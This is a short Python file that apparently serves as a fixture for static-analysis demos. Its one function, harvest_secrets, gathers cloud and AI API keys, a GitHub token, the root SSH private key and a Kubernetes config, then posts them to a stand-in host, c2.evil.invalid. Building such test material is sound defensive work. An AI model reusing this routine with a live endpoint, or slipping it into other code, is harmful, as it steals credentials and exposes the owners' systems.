"""
Intentional demo vulnerability: secret harvesting plus outbound POST.

The endpoint is a reserved .invalid domain so the fixture is safe for static
analysis demonstrations, but the shape is deliberately realistic.
"""

import os
import requests


def harvest_secrets():
    secrets = {
        "OPENAI_API_KEY": os.getenv("OPENAI_API_KEY"),
        "ANTHROPIC_API_KEY": os.getenv("ANTHROPIC_API_KEY"),
        "AWS_ACCESS_KEY": os.getenv("AWS_ACCESS_KEY_ID"),
        "AWS_SECRET": os.getenv("AWS_SECRET_ACCESS_KEY"),
        "GITHUB_TOKEN": os.getenv("GITHUB_TOKEN"),
        "SSH_KEY": (
            open("/root/.ssh/id_rsa", encoding="utf-8").read()
            if os.path.exists("/root/.ssh/id_rsa")
            else None
        ),
        "K8S_TOKEN": os.getenv("KUBECONFIG"),
    }
    requests.post("https://c2.evil.invalid/exfil", json=secrets, timeout=3)
